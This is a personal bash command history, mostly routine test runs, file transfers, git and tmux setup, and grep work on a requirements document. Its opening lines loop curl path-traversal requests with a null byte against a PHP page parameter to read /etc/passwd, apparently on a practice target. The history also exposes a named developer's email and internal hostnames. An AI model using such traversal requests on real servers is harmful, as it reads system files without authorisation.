b=""; for i in {1..50}; do b="$b../"; curl http://35.227.24.107:5001/74c04102f2/?page=nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn/${b}etc/passwd%00; done
b=""; for i in {1..100}; do b="$b../"; curl http://35.227.24.107:5001/74c04102f2/?page=nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn/${b}etc/passwd%00; done
cd scripts/
vi test_php_include.sh
vi test_php_include.sh http://35.227.24.107:5001/74c04102f2/?page=
./test_php_include.sh http://35.227.24.107:5001/74c04102f2/?page=
ll
./test_php_include.sh http://35.227.24.107:5001/74c04102f2/?page="
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
bash -x ./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh 
a="asdfasfd"; echo ${#a}
vi test_php_include.sh 
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh 
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh 
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh 
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh 
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh 
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh 
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh 
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh 
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
vi test_php_include.sh 
./test_php_include.sh "http://35.227.24.107:5001/74c04102f2/?page="
exit
cd /c/miscprojects/cooltest/
./startTest.sh TC_E2E.rb "test_TC_E2E_07";
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_PC_01 test_TC_PC_02 test_TC_PC_03 test_TC_PC_04 test_TC_PC_04b test_TC_PC_05 test_TC_PC_06"
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_PC_03"
./startTest.sh TC_E2E.rb "all";
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_PC_04"
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_PC_02"
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_QS_02"
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_QS_03"
./startTest.sh TC_E2E.rb "test_TC_E2E_07";
./startTest.sh TC_rel4.1.6.rb "test_TC_API_DSPA_04";
./startTest.sh TC_rel4.1.6.rb "test_TC_API_DSPA_05";
./startTest.sh TC_rel4.1.6.rb "test_TC_SECPUBL_DSPA_NP_01";
./startTest.sh TC_rel4.1.6.rb "test_TC_SECPUBL_DSPA_NP_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_SECPUBL_DSPA_NP_03";
./startTest.sh TC_rel4.1.6.rb "test_TC_SECPUBL_DSPA_NP_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_SECPUBL_DSPA_NP_03";
./startTest.sh TC_rel4.1.6.rb "test_TC_SECPUBL_DSPA_P_01";
./startTest.sh TC_rel4.1.6.rb "test_TC_SECPUBL_DSPA_P_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_SECPUBL_DSPA_P_03";
./startTest.sh TC_rel4.1.6.rb "test_TC_SECPUBL_DSPA_P_01";
./startTest.sh TC_rel4.1.6.rb "TC_QueueR_01";
./startTest.sh TC_rel4.1.6.rb "test_TC_QueueR_01";
./startTest.sh TC_rel4.1.6.rb "test_TC_QueueR_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_QueueR_03";
./startTest.sh TC_rel4.1.6.rb "test_TC_QueueR_04";
exit
cd /c/UpWork/
ll
cd Convert_a_chef_cookbook_to_bash_scripts/
ll
cd bash-version/
ll
cd ..
ll
mv bash-version chef2bash
sudo mv bash-version chef2bash
ll
cd ..
exit
cd /c/
cd UpWork/Convert_a_chef_cookbook_to_bash_scripts/
ll
cd chef2bash/
ll
chmod +x -R *.sh
ll
cd recipes/
ll
cd ..
ll
cd ..
ll
exit
cd /c/NAP/NAP4/release-4.1.6/ProductionInstalls/
ll
cd ProductionPackages/
ll
scp *.rpm nap@ncsnv001:/var/opt/nap/packages/
scp *.rpm nap@ncsda001:/var/opt/nap/packages/
scp *.rpm nap@ncsel001:/var/opt/nap/packages/
cd ..
ll
cd MW1-NVL-upgrade/
ll
cd wo4054902task4/
ll
mkdir logs
scp -r nap@ncsnv01:/var/opt/tmp/wo4054902task4/* logs/
scp -r nap@ncsnv001:/var/opt/tmp/wo4054902task4/* logs/
cd ../../..
cd ../..
ll
cd NAP4/release-4.1.6/ProductionInstalls/MW-daytime-fix-GPloader-backlog/
scp nap@ncsda001:/var/opt/tmp/woTT22655562/* woTT22655562/DAL/logs/
scp nap@ncsel001:/var/opt/tmp/woTT22655562/* woTT22655562/ELG/logs/
scp nap@ncsda001:/var/opt/tmp/woTT22655562/wo* woTT22655562/DAL/logs/
scp nap@ncsnv001:/var/opt/tmp/woTT22655562/* woTT22655562/NVL/logs/
cd ..
ll
cd MW-daytime-fix-GPloader-backlog/
ll
cd /c/nokia_git/wo-monitor/
ll
git clone https://gitlabe1.ext.net.nokia.com/costin/wo-monitor.git .
ll
cp /c/NAP/WO/nap_monitor.html .
ll
git add nap_monitor.html 
git status
git commit "initial version" nap_monitor.html 
git commit -m "initial version" nap_monitor.html 
git config --local user.name "Costin Marian Costin"
git config --local user.email "marian_costin.costin.ext@nokia.com"
git add readme.md 
git commit -m "initial version" readme.md 
git push
ls
ll
git checkout master
git branch --unset-upstream
ll
git push
git push master
git push
git push -u origin master
git config credential.helper
git config credential.helper store
git push -u origin master
cd ..
git clone git@gitlabe1.ext.net.nokia.com:costin/nap-ldapsearch-helper.git
git clone https://gitlabe1.ext.net.nokia.com/costin/nap-ldapsearch-helper.git
ll
cd nap-ldapsearch-helper/
git config credential.helper store
ll
cp /c/miscprojects/napLdapHelper/napLdapHelper.sh .
ll
git push -u origin master
git add napLdapHelper.sh 
git commit -m "initial version" napLdapHelper.sh 
git push -u origin master
git config --local user.name "Marian Costin"
git config --local user.email marian_costin.costin.ext@nokia.com
git push -u origin master
find SkypeSetup.exe /c/*
find /c/* -name SkypeSetup.exe
exit
docker
apt-get install docker
cd /c/UpWork/
cd 16Mar2019/csv_py/
docker run --rm -it -v $(pwd):/src python:2.7 python d3.py
apt-get install docker
docker run --rm -it -v $(pwd):/src python:2.7 python d3.py
pyton --version
apt-get install python2.7
python --version
python d3.py 
cd /c/NAP/oldERSs/
ll
watch ls -alh
exit
cd /mnt/g
ll
ls -alh /mnt
ls -alh /mnt/
ls -alh /mnt/*
df -h
cd /dev/
ll
df -h
df -ah
ps -ef |less
exit
ll
cd /c/NAP/NAP4
ll
vim ERSv1.74.txt
cd /c/NAP/NAP4
ll
vim ERSv1.74.txt
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt 
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt  | sort | uniq -c
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt  | sort | uniq -c | grep -v '\t[1]\['
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt  | sort | uniq -c | grep -v '\t[1]\t\['
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt  | sort | uniq -c | grep -v '\t[1] \['
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt  | sort | uniq -c | grep -v ' +[1] \['
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt  | sort | uniq -c | grep -v '\s+[1] \['
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt  | sort | uniq -c | egrep -v '\s+[1] \['
tmux new -s NAP-ERS
tmux ls
tmux -a 1
tmux attach 1
tmux attach-session -t 1
tmux attach-session -t NAP-ERS
exit
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt  | sort | uniq -c | egrep -v '\s+[1] \['
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt  | sort | uniq -c | egrep -v '\s+[1] \['|less
ll
tmux ls
tmux attach
tmux source-file ~/.tmux.conf
exit
git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm
vi ~/.tmux.conf
ll
find / -name tmux.conf
find / -name tmux.conf 2>/dev/null
ls -alh
cd .tmux/
ll
cd ..
ll
vi ~/.tmux.conf
tmux source ~/.tmux.conf
vi ~/.tmux.conf
tmux source ~/.tmux.conf
tmux -version
tmux -V
apt update
apt update tmux
apt get update tmux
apt get tmux
apt-get update tmux
apt-get update
apt-get install tmux
tmux -V
ll
wget https://github.com/tmux/tmux/releases/download/2.9/tmux-2.9.tar.gz
sudo apt-get -y remove tmux
sudo apt-get -y install wget tar libevent-dev libncurses-dev
tar xf tmux-2.9.tar.gz 
cd tmux-2.9/
ll
./configure 
make
sudo make install
cd -
tmux ls
ll
tmux -V
ps -ef | grep tmux
sudo rm -rf /usr/local/src/tmux-\*
sudo mv tmux-2.9 /usr/local/src
ps -ef | grep tmux
tmux kill 102 476
ps -ef | grep tmux
sudo ps -ef | grep tmux
sudo kill 102 476
sudo ps -ef | grep tmux
tmux ls
tmux attach
tmux new -s NAP-ERS
tmux -V
cat .tmux.conf 
exit
ls
less ers-duplicated-req.txt 
cat ers-duplicated-req.txt
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt  | sort | uniq -c | egrep -v '\s+[1] \['|less
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.74.txt|less
mv ERSv1.74.txt ERSv1.7-a.txt 
vi ERSv1.7-b.txt
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|less
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -vP "^$"|less
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -vP "^\s?$"|less
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -vP "^ ?$"|less
less ERSv1.7-b.txt 
vi ERSv1.7-b.txt
grep -oP "\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -vP "^ ?$"|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -vP "^ ?$"|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-1'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-2'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-3'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-4'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-5'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-6'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-7'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-8'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-9'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-10'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-11'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-12'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-13'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-14'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-115'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-15'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-16'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-17'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-18'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-19'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-20'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-21'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-22'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-23'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-24'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-25'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-[0-9]+-'|sort|unic
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP1-[0-9]+-'|sort|uniq
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP'\[NAP1-[0-9]+-'|sort|uniq
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP1-[0-9]+-'|sort|uniq
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP2'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP2-1-'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP2-1-'|sort|uniq -c |less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP2-1-'|sort|uniq -c |grpe -vP ' +1'
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP2-1-'|sort|uniq -c |grep -vP ' +1'
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP2-1-'|less
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP2-1-'
vi nap2-1-reqs
vi ~/.vimrc 
vi nap2-1-reqs
vi ~/.vimrc 
vi nap2-1-reqs
vi ~/.vimrc 
vi nap2-1-reqs
vi ~/.vimrc 
vi nap2-1-reqs
vi ~/.vimrc 
vi nap2-1-reqs
vi ~/.vimrc 
vi nap2-1-reqs
vi ~/.vimrc 
vi nap2-1-reqs
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP "\${i}" ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP "\"${i}"" ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'' ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -P '\'${i}'' ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'' ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[^\]].*' ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'([^\]].*)' ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'([^\]].*) ' ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'(?[^\]].*)' ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'([^\]].*) ' ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+' ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt; echo ${i##[*}; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSvs1.7-b.txt; echo ${i##[*}; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt; echo ${i##[*}; exit done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt; echo ${i##[*}; exit; done;
:q!
exit
vi nap2-1-reqs
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt; echo ${i##[*}; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt; echo ${i##\[*}; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt; echo ${i##*\[}; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt > ${i##*\[}-reqs; done;
ll
ls -alh
exi
ls -alh
vi NAP2-2--reqs 
vi NAP2-3--reqs 
cat ~/.vimrc 
vi NAP2-3--reqs 
vi NAP2-4--reqs 
vi NAP2-5--reqs 
vi NAP2-6--reqs 
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP2-1-'|sort|uniq -c |grep -vP ' +1'
ls -alh NAP*
for i in $(ls -alh NAP*); do cat $i |sort|uniq -c |grep -vP ' +1'; done;
vi nap2-1-reqs
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt; echo ${i##[*}; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt; echo ${i##\[*}; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt; echo ${i##*\[}; done;
for i in $(grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep -oP '\[NAP2-[0-9]+-'|sort|uniq); do grep -oP '\'${i}'[0-9]+-[0-9]+\]' ERSv1.7-b.txt > ${i##*\[}-reqs; done;
ll
ls -alh
exi
ls -alh
vi NAP2-2--reqs 
vi NAP2-3--reqs 
cat ~/.vimrc 
vi NAP2-3--reqs 
vi NAP2-4--reqs 
vi NAP2-5--reqs 
vi NAP2-6--reqs 
grep -oP "^[ \s]?\[NAP[0-9](-[0-9]+){1,3}\]" ERSv1.7-b.txt|grep '\[NAP2-1-'|sort|uniq -c |grep -vP ' +1'
ls -alh NAP*
for i in $(ls -alh NAP*); do cat $i |sort|uniq -c |grep -vP ' +1'; done;
